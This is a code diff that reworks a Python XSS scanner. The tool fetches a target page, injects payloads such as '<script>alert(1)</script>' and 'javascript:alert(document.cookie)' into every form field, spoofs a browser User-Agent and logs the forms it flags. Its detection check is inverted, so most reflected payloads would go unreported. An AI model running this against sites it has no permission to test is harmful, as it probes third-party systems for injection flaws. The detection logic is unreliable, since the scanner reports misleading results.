@@ -1,67 +1,71 @@
 import time
 import random
-from fake_useragent import UserAgent
+import requests
 from bs4 import BeautifulSoup
 from colorama import Fore
-import mechanize
 import re
-import urllib
- 
+from urllib.parse import urljoin, urlencode
+
 def scan(url: str):
-    ua = UserAgent()
-    browser = mechanize.Browser()
-    browser.set_handle_robots(False)
-    browser.set_handle_refresh(False)
-    response = browser.open(url)
-    
-    soup = BeautifulSoup(response.read(), "html.parser")
+    session = requests.Session()
+    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
+
+    try:
+        response = session.get(url)
+        response.raise_for_status()
+    except requests.RequestException as e:
+        print(f"{Fore.RED}Error accessing the URL: {e}")
+        return
+
+    soup = BeautifulSoup(response.text, "html.parser")
     forms = soup.find_all("form")
+
+    payloads = [
+        '"><svg onload=alert(1)>',
+        '<script>alert(1)</script>',
+        'javascript:alert(document.cookie)',
+        '"onmouseover="alert(1)',
+        '\\"-alert(1)}//']
 
     xss_found = []
     for form in forms:
         action = form.get("action")
         method = form.get("method", "get").lower()
+        form_url = urljoin(url, action) if action else url
 
         inputs = form.find_all("input")
+        data = {input_field.get("name"): input_field.get("value", "") for input_field in inputs if input_field.get("name")}
 
-        payload = ['"><svg onload=alert(1)>', '<script>alert(1)</script>', 'javascript:alert(document.cookie)',
-                '"onmouseover="alert(1)']
-
-        data = {}
-        for input_field in inputs:
-            name = input_field.get("name")
-            value = input_field.get("value", "")
-
-            data[name] = value
-
-            for payloads in payload:
-                data[name] = payloads
+        for payload in payloads:
+            for input_name in data.keys():
+                test_data = data.copy()
+                test_data[input_name] = payload
 
                 try:
-                    browser.addheaders = [('User-agent', ua.random)]
                     if method == "post":
-                        response = browser.open(action, data=data)
+                        response = session.post(form_url, data=test_data)
                     else:
-                        response = browser.open(action + "?" + urllib.parse.urlencode(data))
-                except (TypeError, mechanize._mechanize.BrowserStateError):
-                    pass
-                except mechanize.HTTPError:
-                    pass
-                except mechanize._response.get_seek_wrapper:
-                    pass
-                else:
-                    response_text = response.read().decode("utf-8")
-                    if payloads in response_text and not re.search(r'<svg|<script|onmouseover', response_text, re.IGNORECASE):
-                        xss_found.append(payloads)
+                        response = session.get(form_url, params=test_data)
+                    
+                    response.raise_for_status()
+                except requests.RequestException:
+                    continue
 
-                        with open("output/xss.txt", "a") as f:
-                            f.write(f"--Vulnerable Form--\n\n")
-                            f.write(f"Payload: {payloads}\n\n")
-                            f.write(f"{form}\n\n")
-                    else:
-                        pass
-        time.sleep(random.randint(1, 3))  # Add a random delay between requests
+                if payload in response.text and not re.search(r'<svg|<script|onmouseover', response.text, re.IGNORECASE):
+                    xss_found.append((payload, form_url, input_name))
+                    
+                    with open("output/xss.txt", "a") as f:
+                        f.write(f"--Vulnerable Form--\n\n")
+                        f.write(f"URL: {form_url}\n")
+                        f.write(f"Method: {method.upper()}\n")
+                        f.write(f"Input: {input_name}\n")
+                        f.write(f"Payload: {payload}\n\n")
+                        f.write(f"{form}\n\n")
+
+            time.sleep(random.uniform(0.5, 1.5))  # Add a random delay between requests
 
     if xss_found:
         print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Found: {Fore.MAGENTA}{len(xss_found)}")
-        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Vulnerable Form: {Fore.MAGENTA}saved to /output")
+        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Vulnerable Forms: {Fore.MAGENTA}saved to /output/xss.txt")
+    else:
+        print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No XSS vulnerabilities found.")
